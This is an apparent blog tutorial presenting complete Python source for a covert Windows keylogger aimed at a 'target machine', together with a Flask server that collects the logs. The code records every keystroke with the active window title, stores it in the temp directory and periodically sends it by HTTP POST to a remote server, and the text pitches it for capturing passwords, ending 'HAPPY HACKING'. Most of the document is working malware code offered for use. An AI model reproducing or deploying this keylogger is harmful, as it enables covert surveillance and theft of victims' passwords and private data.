---
title: Capture keystrokes from target machine with python
published: true
---

In this article, we will explore the concept of a keylogger and how it can be implemented using the Python programming language. A keylogger is a type of surveillance software that tracks and records the keys struck on a keyboard, typically in covert manner. This information can then be used for various purposes, such as monitoring a user's activity or capturing sensitive information such as passwords.

### [](#header-3) what is a keylogger?
A keylogger is a piece of software or hardware that is used to record the keystrokes that are typed on a keyboard. Keyloggers can be used for a variety of purposes, such as monitoring user activity on a computer, recovering lost or forgotten passwords, and even as a form of surveillance. Keyloggers are often used by hackers to obtain sensitive information such as passwords and credit card numbers. Some keyloggers are designed to be stealthy and difficult to detect, while others may be openly installed with the user's knowledge. Keyloggers can be installed on a computer without the user's knowledge or consent, and can pose a serious security risk if not properly protected against.

### [](#header-3) Let's code

```python
from pynput.keyboard import Listener
import tempfile
import threading
import os
import win32gui
from datetime import datetime
import requests
```

the `__init__` method of the Keylogger class initializes several attributes with default values, including the `logTimer`, `reportTimer`, `sizeThreshold`, and `serverURL` attributes. It also sets the `log_timer` and `report_timer` attributes to None, and changes the working directory to the system's temporary directory. Finally, it cancels the `log_timer` and `report_timer` if they are not `None`.

```python
class Keylogger:
    # The constructor initializes the Keylogger's attributes with default values
    # for the log timer, report timer, size threshold, and server URL
    def __init__(self, logTimer=60, reportTimer=3600, sizeThreshold=10000, serverURL="http://127.0.0.1:5000/log"):
        self.string = ''  # the string to log key presses to
        self.window = ''  # the name of the current window
        self.logTimer = logTimer  # the interval at which to log key presses to a file
        # the interval at which to report log data to the server
        self.reportTimer = reportTimer
        # the size threshold at which to report log data to the server
        self.sizeThreshold = sizeThreshold
        self.log_timer = None  # a timer object for logging key presses to a file
        self.report_timer = None  # a timer object for reporting log data to the server
        self.serverURL = serverURL  # the URL of the server to report log data to
        # Change the working directory to the system's temporary directory
        os.chdir(tempfile.gettempdir())
        # Cancel the log_timer and report_timer if they are not None
        if self.log_timer is not None:
            self.log_timer.cancel()
        if self.report_timer is not None:
            self.report_timer.cancel()
```
The `get_window_name` method is used to get the name of the window that currently has focus. This method uses the `win32gui` module to get the handle of the foreground window and then gets the text associated with that window handle. This text is the name of the `window` and is returned by the method. This method is called whenever a key is pressed, and is used to update the window attribute with the name of the current window. This allows the keylogger to keep track of which window the key presses are happening in and to log the window name along with the key presses.

```python
# This method returns the name of the window that currently has focus
    def get_window_name(self):
        w = win32gui
        return w.GetWindowText(w.GetForegroundWindow())
    # This method logs a key press and adds the appropriate character to the string attribute
```
The `onpress` method is a member of the `Keylogger` class and is used to log a key press to the `string` attribute. This method is called whenever a key is pressed on the keyboard, and is passed the `key` object as an argument. The `onpress` method first creates a timestamp for the current time and checks if the name of the current window is different from the previously recorded window. If it is, it updates the `window` attribute with the current window name and adds a new entry to the log string with the window name and timestamp. Next, the method defines a dictionary of key mappings for special keys that don't have a character representation, such as the numeric keypad keys. If the `key` object has a 'vk' attribute, it is a special key, and the method looks up its mapped value in the key_mappings dictionary and adds it to the `string` attribute. Otherwise, it adds the character representation of the key to the `string` attribute. If the `key` object doesn't have a character representation, the method handles some special cases manually, such as the space key and the enter key. Finally, the method catches any exceptions that may be thrown and adds '??' to the `string` attribute if an exception occurs.

```python
def onpress(self, key):
       # Create a timestamp for the current time
        timestamp = datetime.timestamp(datetime.now())
        # If the name of the current window is different from the previously recorded window,
        # update the name of the current window and add a new entry to the log string with the
        # window name and timestamp
        if self.window != self.get_window_name():
            self.window = self.get_window_name()
            self.string += "\n[ " + self.window + \
                " (" + datetime.fromtimestamp(timestamp).strftime("%m/%d/%Y, %Hh%Mm%Ss") + ")]\n"

        # Define a dictionary of key mappings for special keys that don't have a character representation
        key_mappings = {
            96: "0",
            97: "1",
            98: "2",
            99: "3",
            100: "4",
            101: "5",
            102: "6",
            103: "7",
            104: "8",
            105: "9",
            106: "*",
            107: "+",
            109: "-",
            110: "."
        }

        try:
            # If the key has a 'vk' attribute, it is a special key with no character representation,
            # so we look up its mapped value in the key_mappings dictionary
            if hasattr(key, 'vk') and 96 <= key.vk <= 110:
                self.string += key_mappings.get(key.vk, key.char)
            else:
                # Otherwise, we add the character representation of the key to the log string
                self.string += key.char
        except AttributeError:
            # If the key doesn't have a character representation, we handle some special cases
            # manually, such as the space key and the enter key
            if str(key) == "Key.space":
                self.string += " "
            elif str(key) == "Key.enter":
                self.string += '\n'
            elif str(key) == "Key.shift":
                pass
            else:
                self.string += ' [' + str(key).strip('Key.') + '] '
        except:
            self.string += "??"
```
The `send_log` method is used to send the contents of a log file to the server specified by the `serverURL` attribute. This method takes a `log_file` argument which specifies the name of the log file to send. It first opens the log file for reading and reads the contents of the file into a variable called `log_data`. Then, it sends a `POST` request to the server with the `log_data` as the request body. If the request is successful, it returns `True`. Otherwise, it returns `False`. If an error occurs while sending the request, it returns `False`. This method is used by the `report` method to send the log data to the server.

```python
def send_log(self, log_file):
        # Open the log file for reading
        with open(log_file, "r") as f:
            # Read the contents of the log file
            log_data = f.read()
        try:
            response = requests.post(self.serverURL, data=log_data)
            # Return True if the request was successful (i.e. the server returned a 200 status code),
            # otherwise return False
            return True if response.status_code == 200 else False
        except:
            # If an error occurred while sending the request, return False
            return False
```

The `log` method is used to log key presses to a file. This method creates a new log file if it does not already exist and opens it for writing. It then writes the contents of the `string` attribute to the log file and closes it. This method is called periodically by the `log_timer` timer object.

```python
 def log(self):
        # If the log_timer is not None, cancel it
        if self.log_timer is not None:
            self.log_timer.cancel()

        # Open the log file for appending
        with open("log.txt", "a") as f:
            # Attempt to write the current log string to the log file
            try:
                f.write(self.string)
            except:
                # If an error occurs while writing to the log file, do nothing
                pass

            # Clear the current log string
            self.string = ""

        # Create a new timer object with the specified logTimer interval
        self.log_timer = threading.Timer(self.logTimer, self.log)
        # Start the timer
        self.log_timer.start()
```
The `report` method is used to send the log data in the file to the server. It first checks if the log file exists and is not empty, and then sends a `POST` request to the server with the log data as the request body. If the request is successful, it deletes the log file and resets the `string` attribute to an empty string. If the request is not successful, it logs the error message to the `string` attribute. The `report` method is called periodically by the `report_timer` timer object.

```python
 def report(self):
        # If the report_timer is not None, cancel it
        if self.report_timer is not None:
            self.report_timer.cancel()

        # If the log file is larger than the specified size threshold,
        if os.stat('log.txt').st_size > self.sizeThreshold:
            # Attempt to send the log file to the server and remove it if the send was successful
            try:
                # Send the log file to the server
                success = self.send_log('log.txt')
                # If the send was successful, remove the log file
                if success:
                    os.remove('log.txt')
            except:
                # If an error occurred while sending the log file, do nothing
                pass

        # Create a new timer object with the specified reportTimer interval
        self.report_timer = threading.Timer(self.reportTimer, self.report)
        # Start the timer
        self.report_timer.start()
```
The `run` method is used to start the keylogger. This method sets up the `log_timer` and `report_timer` timer objects and starts them. The `log_timer` timer object calls the `log` method periodically to log key presses to a file. The `report_timer` timer object calls the `report` method periodically to send the log data to the server. This method also sets up a `KeyboardListener` object from the `pynput` library and starts it. The `KeyboardListener` object calls the `onpress` method of the Keylogger object whenever a key is pressed on the keyboard. The `onpress` method logs the key press and adds the appropriate character to the `string` attribute.
```python
def run(self):
        # Start the report timer
        self.report()
        # Start the log timer
        self.log()
        # Create a Listener object and specify the onpress callback function
        with Listener(on_press=self.onpress) as listener:
            # Start listening for key presses
            listener.join()


logger = Keylogger()
logger.run()
```
This code defines a simple Flask server that receives log data from the keylogger. When the server receives a request at the `/log` endpoint, it gets the current date and time and uses that information to create a unique filename for the log data. The log data is then written to a file with that filename. The server then responds with the string 'OK' to indicate that the request was successful.
```python
# Import the Flask class from the flask module
from flask import Flask, request
# Import the datetime class from the datetime module
from datetime import datetime

# Create a Flask application instance
app = Flask(__name__)

# Define a route for the /log endpoint that only accepts POST requests


@app.route('/log', methods=['POST'])
def receive_log():
    # Get the current datetime
    now = datetime.now()
    # Define a filename for the log data based on the current datetime
    file_name = f"log_{now.year}_{now.month}_{now.day}_{now.hour}_{now.minute}_{now.second}.txt"
    # Get the log data from the request body
    log_data = request.data
    # Open the log file for writing in binary mode
    with open(file_name, "wb") as f:
        # Write the log data to the log file
        f.write(log_data)

    # Return 'OK' to indicate that the request was successful
    return 'OK'


# If the script is run directly, start the Flask application
if __name__ == '__main__':
    app.run()
```

### [](#header-3)
In conclusion, we have seen how to develop a basic keylogger using Python. This type of software can be a useful tool for monitoring a user's activity or capturing sensitive information. By importing the necessary libraries and modules in Python, defining a function for recording keystrokes, and creating a Keylogger class to manage the keylogger's behavior, we can create a functional keylogger that can run in the background on a computer. This keylogger can be easily modified and expanded upon to suit specific needs and requirements.<br>
Full code in github [here](https://github.com/Ahmed-Z/RemoteKeylogger).<br>
HAPPY HACKING.